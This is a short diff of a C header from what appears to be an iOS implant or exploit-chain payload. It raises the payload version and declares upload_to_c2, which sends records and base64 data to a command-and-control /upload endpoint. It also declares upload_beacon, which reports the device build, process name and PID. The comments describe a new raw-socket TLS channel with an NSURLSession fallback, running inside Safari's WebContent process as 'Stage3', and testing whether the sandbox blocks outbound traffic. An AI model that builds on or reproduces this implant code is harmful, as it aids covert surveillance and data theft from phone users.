@@ -13,7 +13,7 @@
  * behaviour so the operator can confirm which version is running on-device.
  * Format: "<major>.<minor>".  Major = breaking change, minor = incremental.
  */
-#define PAYLOAD_VERSION "1.2"
+#define PAYLOAD_VERSION "1.3"
 
 /*
  * upload_to_c2 — HTTP(S) POST one record to the Go /upload endpoint.
@@ -26,11 +26,13 @@ void upload_to_c2(const char *category, const char *path,
                   const char *description, const char *b64data);
 
 /*
- * upload_beacon — lightweight synchronous probe (5-second timeout).
+ * upload_beacon — lightweight synchronous probe (~10-second max block).
+ * Uses Channel B (raw socket + SecureTransport) first; falls back to
+ * Channel A (NSURLSession) if Channel B fails.
  * Safe to call directly from process() in Stage3's calling context.
- * Reports: version, iOS build, process name, PID.
- * If this appears in server logs, Foundation + NSURLSession work from the dylib.
- * If it does NOT appear, something below ObjC level is broken.
+ * Reports: PAYLOAD_VERSION, iOS build, process name, PID.
+ * If this appears in server logs → raw-socket path works inside WebContent.
+ * If it does NOT appear → sandbox blocks port-443 outbound or TLS failed.
  */
 void upload_beacon(void);
 
